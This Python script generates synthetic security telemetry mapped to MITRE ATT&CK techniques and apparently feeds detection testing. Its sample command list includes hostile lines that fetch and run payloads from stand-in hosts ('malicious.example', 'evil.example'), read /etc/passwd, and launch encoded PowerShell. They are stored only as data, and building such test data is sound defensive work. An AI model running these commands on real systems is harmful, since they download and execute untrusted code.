#!/usr/bin/env python3
import json
import random
from datetime import datetime, timedelta
import os

def generate_telemetry_data(num_events=1000):
    """
    Generate sample security telemetry data.
    """
    random.seed(42)

    techniques = [
        {"technique_id": "T1055", "name": "Process Injection", "tactic": "Defense Evasion", "severity": "high"},
        {"technique_id": "T1059", "name": "Command and Scripting Interpreter", "tactic": "Execution", "severity": "high"},
        {"technique_id": "T1082", "name": "System Information Discovery", "tactic": "Discovery", "severity": "medium"},
        {"technique_id": "T1041", "name": "Exfiltration Over C2 Channel", "tactic": "Exfiltration", "severity": "critical"},
        {"technique_id": "T1071", "name": "Application Layer Protocol", "tactic": "Command and Control", "severity": "high"},
        {"technique_id": "T1110", "name": "Brute Force", "tactic": "Credential Access", "severity": "critical"},
        {"technique_id": "T1562", "name": "Impair Defenses", "tactic": "Defense Evasion", "severity": "high"},
        {"technique_id": "T1003", "name": "OS Credential Dumping", "tactic": "Credential Access", "severity": "critical"},
        {"technique_id": "T1027", "name": "Obfuscated Files or Information", "tactic": "Defense Evasion", "severity": "medium"},
        {"technique_id": "T1036", "name": "Masquerading", "tactic": "Defense Evasion", "severity": "medium"},
    ]

    hosts = ["host-01", "host-02", "host-03", "db-01", "web-01", "app-01", "jump-01"]
    users = ["alice", "bob", "charlie", "admin", "svc_backup", "svc_web"]
    process_names = ["powershell.exe", "cmd.exe", "python3", "svchost.exe", "nginx", "sshd", "bash"]
    commands = [
        "powershell -enc SQBFAFgA",
        "cmd /c whoami && ipconfig",
        "python3 -c 'import os; print(os.listdir())'",
        "bash -c 'cat /etc/passwd'",
        "curl http://malicious.example/payload.sh | bash",
        "wget http://evil.example/bin -O /tmp/bin && chmod +x /tmp/bin && /tmp/bin",
        "netstat -antp",
        "uname -a",
    ]

    start_time = datetime.now() - timedelta(days=2)
    end_time = datetime.now()

    events = []

    for _ in range(num_events):
        tech = random.choice(techniques)
        ts = start_time + timedelta(seconds=random.randint(0, int((end_time - start_time).total_seconds())))
        host = random.choice(hosts)
        user = random.choice(users)
        process = random.choice(process_names)
        cmdline = random.choice(commands)

        src_ip = f"10.0.{random.randint(0,9)}.{random.randint(1,254)}"
        dst_ip = f"172.16.{random.randint(0,9)}.{random.randint(1,254)}"
        dst_port = random.choice([22, 80, 443, 3389, 445, 53, 8080])
        protocol = random.choice(["TCP", "UDP", "HTTP", "HTTPS", "SSH"])
        confidence = round(random.uniform(0.5, 0.99), 2)

        if random.random() < 0.25:
            tech = random.choice([t for t in techniques if t["technique_id"] in ["T1059", "T1082", "T1071"]])

        event = {
            "timestamp": ts.isoformat(),
            "host": host,
            "user": user,
            "process_name": process,
            "command_line": cmdline,
            "technique_id": tech["technique_id"],
            "technique_name": tech["name"],
            "tactic": tech["tactic"],
            "severity": tech["severity"],
            "confidence": confidence,
            "network_connection": {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "dst_port": dst_port,
                "protocol": protocol
            }
        }

        events.append(event)

    events.sort(key=lambda x: x["timestamp"])
    return events

def save_telemetry_data(events, filepath):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w") as f:
            json.dump(events, f, indent=2)
        print(f"Saved telemetry data to {filepath} ({len(events)} events)")
        return True
    except Exception as e:
        print("Error saving telemetry data:", str(e))
        return False

if __name__ == "__main__":
    events = generate_telemetry_data(num_events=1000)
    save_telemetry_data(events, "../data/telemetry/security_telemetry.json")
